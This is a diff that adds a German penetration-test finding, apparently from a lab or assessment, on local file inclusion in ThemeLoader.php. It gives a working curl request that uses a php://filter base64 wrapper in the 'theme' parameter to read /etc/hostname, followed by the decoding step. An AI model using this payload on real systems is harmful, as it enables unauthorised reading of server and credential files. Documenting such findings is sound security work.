@@ -1,0 +1,14 @@
+=== FINDING: LFI über ThemeLoader.php (PHP-Wrapper / Dateilektüre) ===
+
+$ curl -sS "http://10.10.10.10/ThemeLoader.php?theme=php://filter/convert.base64-encode/resource=/etc/hostname"
+
+(... HTML-Auszug ...)
+<!-- Loading theme from: php://filter/convert.base64-encode/resource=/etc/hostname -->
+c3BlYXJzLUxpbnV4Cg==
+
+$ echo c3BlYXJzLUxpbnV4Cg== | base64 -d
+spears-Linux
+
+Erkenntnis: Der Parameter theme lädt beliebige Pfade/Wrapper; Base64-Kodierung erleichtert Export sensibler Inhalte (hier Hostname konsistent mit XXE).
+
+Hinweis: `evidence_suspected_not_fully_proven.txt` (E16) ist explizit als „VERDACHT / NICHT IN DIESEM LAUF BELEGT“ markiert und wird absichtlich nicht in die bestätigte Schwachstellenbewertung aufgenommen.
